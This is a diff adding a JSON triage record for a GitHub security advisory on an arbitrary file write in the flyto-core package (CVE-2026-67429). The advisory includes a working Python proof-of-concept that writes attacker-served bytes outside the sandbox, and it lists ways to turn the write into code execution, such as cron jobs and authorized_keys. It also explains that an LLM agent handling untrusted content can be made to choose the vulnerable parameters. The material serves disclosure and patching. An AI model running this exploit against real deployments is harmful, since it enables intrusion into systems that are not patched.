@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/204785446?v=4\", \"events_url\": \"https://api.github.com/users/kaimandalic/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/kaimandalic/followers\", \"following_url\": \"https://api.github.com/users/kaimandalic/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/kaimandalic/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/kaimandalic\", \"id\": 204785446, \"login\": \"kaimandalic\", \"node_id\": \"U_kgDODDTHJg\", \"organizations_url\": \"https://api.github.com/users/kaimandalic/orgs\", \"received_events_url\": \"https://api.github.com/users/kaimandalic/received_events\", \"repos_url\": \"https://api.github.com/users/kaimandalic/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/kaimandalic/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/kaimandalic/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/kaimandalic\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-67429\", \"cvss\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}, {\"cwe_id\": \"CWE-73\", \"name\": \"External Control of File Name or Path\"}], \"description\": \"## Summary\\n\\n`image.download` fetches a URL and writes the response to disk. It does not use the central path guard (`validate_path_with_env_config`, which confines writes to `FLYTO_SANDBOX_DIR`); instead it confines the output to `output_dir`, but `output_dir` is itself a caller parameter. Since the attacker sets both the target and the base it is checked against, the check is meaningless, and attacker-controlled bytes (the HTTP response) land at any absolute path the process can write.\\n\\n## Affected code\\n\\n`src/core/modules/atomic/image/download.py`:\\n\\n```python\\noutput_path = params.get('output_path')\\noutput_dir  = params.get('output_dir', '/tmp')   # caller-controlled base\\n...\\nbase_real   = os.path.realpath(output_dir)\\ntarget_real = os.path.realpath(output_path)\\nif os.path.commonpath([base_real, target_real]) != base_real:\\n    raise Exception('Invalid file path')          # base is attacker-chosen, so always passes\\n...\\ncontent = await response.read()                   # attacker-hosted bytes\\nwith open(target_real, 'wb') as f:\\n    f.write(content)\\n```\\n\\n`commonpath` is used correctly, but the base is caller-supplied, so setting `output_dir='/'` passes any target. `file.write`, by contrast, uses `validate_path_with_env_config()` and stays inside `FLYTO_SANDBOX_DIR`.\\n\\nThis is not isolated to `image.download`. Most other file-writing modules write to a caller `output_path` with no path check at all: `image.convert`, `image.resize`, `image.crop`, `image.compress`, `image.rotate`, `image.watermark`, `image.qrcode_generate`, `document.excel_write`, `document.pdf_fill_form`, `document.word_to_pdf`, `document.pdf_to_word` and `browser.pagination`. Their content is format-constrained (a valid PNG/XLSX/SVG/PDF) but the path is fully attacker-chosen; `image.download` is the strongest because the bytes are arbitrary.\\n\\n## Reproduction\\n\\nSave as `filewrite_poc.py`, run with `PYTHONPATH=src/src python filewrite_poc.py`. It sets `FLYTO_SANDBOX_DIR` to a sandbox dir and writes to a sibling directory outside it.\\n\\n```python\\n#!/usr/bin/env python3\\nimport asyncio\\nimport os\\nimport tempfile\\nimport threading\\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\\n\\nos.environ[\\\"FLYTO_ALLOWED_HOSTS\\\"] = \\\"localhost\\\"   # let the content host pass the SSRF check\\nEVIL = b\\\"#!/bin/sh\\\\n# attacker-controlled content written outside the sandbox\\\\necho pwned\\\\n\\\"\\n\\nclass Content(BaseHTTPRequestHandler):\\n    def do_GET(self):\\n        self.send_response(200); self.send_header(\\\"Content-Type\\\", \\\"image/jpeg\\\")\\n        self.send_header(\\\"Content-Length\\\", str(len(EVIL))); self.end_headers(); self.wfile.write(EVIL)\\n    def log_message(self, *a): pass\\n\\nasync def run(mid, params):\\n    from core.modules.registry import ModuleRegistry\\n    try:\\n        return (\\\"RESULT\\\", await ModuleRegistry.execute(mid, params=params, context={}))\\n    except Exception as e:\\n        return (\\\"EXC\\\", f\\\"{type(e).__name__}: {e}\\\")\\n\\nasync def main():\\n    from core.modules.atomic import register_all\\n    register_all()\\n    threading.Thread(target=HTTPServer((\\\"127.0.0.1\\\", 8080), Content).serve_forever, daemon=True).start()\\n    root = tempfile.mkdtemp(prefix=\\\"flyto_poc_\\\")\\n    sandbox = os.path.join(root, \\\"sandbox\\\"); os.makedirs(sandbox)\\n    escape = os.path.join(root, \\\"ESCAPE\\\"); os.makedirs(escape)\\n    os.environ[\\\"FLYTO_SANDBOX_DIR\\\"] = sandbox\\n    target = os.path.join(escape, \\\"pwned\\\")   # OUTSIDE the sandbox\\n    print(\\\"A) file.write:\\\", await run(\\\"file.write\\\", {\\\"path\\\": target, \\\"content\\\": \\\"x\\\"}))\\n    print(\\\"B) image.download:\\\", await run(\\\"image.download\\\", {\\n        \\\"url\\\": \\\"http://localhost:8080/x.jpg\\\", \\\"output_dir\\\": escape, \\\"output_path\\\": target}))\\n    print(\\\"file written outside sandbox?\\\", os.path.exists(target))\\n    if os.path.exists(target):\\n        print(\\\"content:\\\", open(target, \\\"rb\\\").read())\\n\\nif __name__ == \\\"__main__\\\":\\n    asyncio.run(main())\\n```\\n\\nOutput:\\n\\n```\\nA) file.write:     ('EXC', 'ModuleError: [PATH_TRAVERSAL] Path escapes base directory: <root>/ESCAPE/pwned ...')\\nB) image.download: ('RESULT', {'ok': True, 'path': '<root>/ESCAPE/pwned', 'size': 79, ...})\\nfile written outside sandbox? True\\ncontent: b'#!/bin/sh\\\\n# attacker-controlled content written outside the sandbox\\\\necho pwned\\\\n'\\n```\\n\\n`file.write` refuses the out-of-sandbox path; `image.download` writes attacker bytes there. Reproduced through the running HTTP API as well.\\n\\n## Reachability (why this is not operator self-service)\\n\\n`output_dir`, `output_path` and `url` are not supplied by the trusted operator. Every non-denylisted module is exposed to an AI agent through the generic `execute_module(module_id, params)` MCP tool (`core/mcp_handler.py`, `params` taken from the model's `arguments`) and to hosted-API clients, so these parameters are chosen by the LLM (which processes untrusted content) or a remote client. `FLYTO_SANDBOX_DIR` and the guard `file.write` uses exist specifically to confine file operations to a directory the caller cannot change; this module ignores that confinement and lets the caller pick both the target and the base it is checked against. Defeating a confinement control the vendor built is a bug, not intended behavior.\\n\\n## Impact\\n\\nWrite arbitrary content to an arbitrary path outside the operator's sandbox — overwrite config, drop a shell profile, cron job or `authorized_keys`, or replace a Python module, leading to code execution in typical deployments. The URL is SSRF-checked, so the attacker hosts the payload on their own public server (which the guard allows).\\n\\n## Suggested fix\\n\\nUse `validate_path_with_env_config()` for every module that writes files, so all writes are confined to `FLYTO_SANDBOX_DIR` (a base the caller cannot change), never to a caller-supplied `output_dir`.\", \"ghsa_id\": \"GHSA-2956-977x-2w3r\", \"github_reviewed_at\": \"2026-07-30T14:46:43Z\", \"html_url\": \"https://github.com/advisories/GHSA-2956-977x-2w3r\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-2956-977x-2w3r\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-67429\"}], \"nvd_published_at\": \"2026-07-29T19:16:52Z\", \"published_at\": \"2026-07-30T14:46:43Z\", \"references\": [\"https://github.com/flytohub/flyto-core/security/advisories/GHSA-2956-977x-2w3r\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-67429\", \"https://github.com/flytohub/flyto-core/commit/d5f89d71303e3c1e6418d347c5c55fcd173cc8cc\", \"https://github.com/flytohub/flyto-core/releases/tag/v2.26.6\", \"https://github.com/advisories/GHSA-2956-977x-2w3r\"], \"repository_advisory_url\": \"https://api.github.com/repos/flytohub/flyto-core/security-advisories/GHSA-2956-977x-2w3r\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/flytohub/flyto-core\", \"summary\": \"Flyto2 Core: Arbitrary file write via image.download (and other file-writing modules)\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-30T14:46:44Z\", \"url\": \"https://api.github.com/advisories/GHSA-2956-977x-2w3r\", \"vulnerabilities\": [{\"first_patched_version\": \"2.26.7\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"flyto-core\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.26.7\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-2956-977x-2w3r",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "flyto-core: < 2.26.7"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-67429"
+    ],
+    "cvss_score": 10.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "flyto-core"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-30T19:38:01.467866Z",
+  "provenance": {
+    "content_sha256": "53230cf0d4e62053579f4abc83d656ff9aeac6f1d50289292edfb543866e2e0c",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-30T14:46:43Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-2956-977x-2w3r",
+  "status": "active",
+  "title": "Flyto2 Core: Arbitrary file write via image.download (and other file-writing modules)",
+  "updated_at": "2026-07-30T14:46:44Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-2956-977x-2w3r"
+}
